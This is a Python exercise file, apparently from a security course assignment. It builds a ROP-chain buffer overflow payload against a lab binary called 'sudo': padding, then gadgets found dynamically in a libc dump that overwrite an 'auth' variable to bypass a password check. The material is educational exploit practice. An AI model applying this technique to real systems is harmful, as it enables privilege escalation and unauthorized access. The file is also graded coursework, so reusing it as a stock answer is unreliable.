import os
import sys
import base64

import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
POP_EAX = 'POP eax' # mov PATCHED_AUTH into eax
POP_EDI = 'POP edi' # mov addresses.AUTH into edi
STOSD = 'stosd' # mov PATCHED_AUTH into address.AUTH aka mov PATCHED_AUTH into auth

PATCHED_AUTH = 0x01

options = ["sub dword ptr [ebx], {0}", "add dword ptr [ebx], {0}", "xor dword ptr [ebx], {0}", "or dword ptr [ebx], {0}", "and dword ptr [ebx], {0}", "adc dword ptr [ebx], {0}", "andn dword ptr [ebx], {0}", "sub dword ptr [ebx], {0}"]

def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    addr_rop_chain_part_1 = search.find(POP_EAX)
    addr_rop_chain_part_2 = search.find(POP_EDI)
    addr_rop_chain_part_3 = search.find(STOSD)
    # padding then assign eax to patched value and the address to patch
    # and patch the address
    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addresses.address_to_bytes(addr_rop_chain_part_1) + addresses.address_to_bytes(PATCHED_AUTH) + addresses.address_to_bytes(addr_rop_chain_part_2) + addresses.address_to_bytes(addresses.AUTH) + addresses.address_to_bytes(addr_rop_chain_part_3) + addresses.address_to_bytes(addresses.ORIGIN_RET_ADDR)
    return encoded_payload


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
